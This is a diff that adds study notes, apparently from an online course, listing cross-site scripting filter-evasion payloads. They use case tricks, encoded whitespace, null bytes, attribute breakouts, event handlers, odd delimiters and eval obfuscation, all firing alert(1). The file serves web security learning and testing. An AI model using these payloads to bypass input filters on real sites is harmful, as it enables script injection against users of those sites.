@@ -1,0 +1,64 @@
+# Notes taken from XSSRat Survival guide course on Udemy
+# XSS Filter Evasion Techniques
+
+XSS script varients:
+# <script>alert(1)</script>
+# <script >alert(1)</script>
+# <script >alert(1)</script>
+# Encoded tabs/newlines/CR
+# <script&#9>alert(1)</script>
+# <script&#10>alert(1)</script>
+# <script&#13>alert(1)</script>
+Capital letters
+# <ScRipT>alert(1)</sCriPt>
+Nullbytes
+# <%00script>alert(1)</script>
+# <script>al%00ert(1)</script>
+
+Attributes & tags
+# <input type="text" name="input" value="hello">
+# <input type="text" name="input" value="><script>alert(1)</script>
+# <randomtag type="text" name="input" value="><script>alert(1)</script>
+# <input/type="text" name="input" value="><script>alert(1)</script>
+# <input&#9type="text" name="input" value="><script>alert(1)</script>
+# <input&#10type="text" name="input" value="><script>alert(1)</script>
+# <input&#13type="text" name="input" value="><script>alert(1)</script>
+# <input/'type="text" name="input" value="><script>alert(1)</script>
+# <iNpUt type="text" name="input" value="><script>alert(1)</script>
+Nullbytes
+# <%00input type="text" name="input" value="><script>alert(1)</script>
+# <inp%00ut type="text" name="input" value="><script>alert(1)</script>
+# <input t%00ype="text" name="input" value="><script>alert(1)</script>
+# <input type="text" name="input" value="><script>a%00lert(1)</script>
+
+Event handlers
+# <input onsubmit=alert(1)>
+
+Delimiters & brackers
+# <img onerror="alert(1)"src=x>
+# <img onerror='alert(1)'src=x>
+URL encodign
+# <img onerror=&#34alert(1)&#34src=x>
+# <img onerror=&#39alert(1)&#39src=x>
+Backticks
+# <img onerror=`alert(1)`src=x>
+Encoded backtics
+# <img onerror=&#96alert(1)&#96src=x>
+Double use of delimiters
+# <<script>alert(1)//<</script>
+Unknown Delimiters
+# «input onsubmit=alert(1)»
+Encoded
+# &#174input onsubmit=alert(1)&#175
+
+Eval()
+# <script>eval('a\u006cert(1)')</script>
+# <script>eval('al' + 'ert(1)')</script>
+# <script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>
+
+Filtered words 
+# <scrscriptipt> might become <script>
+
+Notes:
+Resources
+# https://portswigger.net/web-security/cross-site-scripting/cheat-sheet - Event
